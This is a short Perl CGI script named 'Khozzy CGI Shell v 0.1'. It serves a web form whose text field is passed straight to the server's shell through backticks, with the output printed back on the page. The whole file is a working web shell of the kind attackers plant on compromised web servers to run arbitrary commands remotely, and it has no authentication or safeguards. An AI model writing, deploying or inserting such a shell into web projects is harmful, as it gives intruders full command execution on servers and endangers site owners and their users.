#!/usr/bin/perl -w
use CGI;

$co = new CGI;

print $co->header,
        $co->start_html(
        -title=>'Khozzy CGI Shell',
        -author=>'Khozzy',
        -bgcolor=>'black',
        -text=>'white'
        ),
        $co->center($co->h1("Khozzy CGI Shell v 0.1")),
        $co->startform(
                -method=>POST,
                ),
        "Enter command to execute : ",
        $co->textfield('text')," ",
        $co->submit(
                -value=>'Execute',
                -action=>($cmd = $co->param('text'))
                ),
       
        $co->hr, $co->center("Results"),$co->hr,
        "<pre><font color=red>",
        @result = `$cmd`,
        "</pre></font>",
        $co->hr, $co->center("Results"),$co->hr,
        $co->end_html;